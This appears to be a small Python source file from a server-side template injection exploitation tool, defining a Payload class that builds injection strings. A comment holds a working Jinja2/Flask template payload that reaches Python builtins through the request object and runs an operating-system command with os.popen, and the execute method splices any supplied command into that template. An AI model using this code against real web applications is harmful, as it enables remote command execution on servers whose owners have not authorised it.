class Payload:
    def __init__(self, base: str, base_result: str, for_execute: str = None):
        # for execute example {{ request.__class__._load_form_data.__globals__.__builtins__.__import__("os").popen("for_execute").read()}}
        self.base = base
        self.base_result = base_result
        self.for_execute = for_execute

    def execute(self, command: str) -> str | None:
        if self.for_execute:
            for_execute_pars = self.for_execute.split("for_execute")

            return f"{for_execute_pars[0]}{command}{for_execute_pars[1]}"

        return None


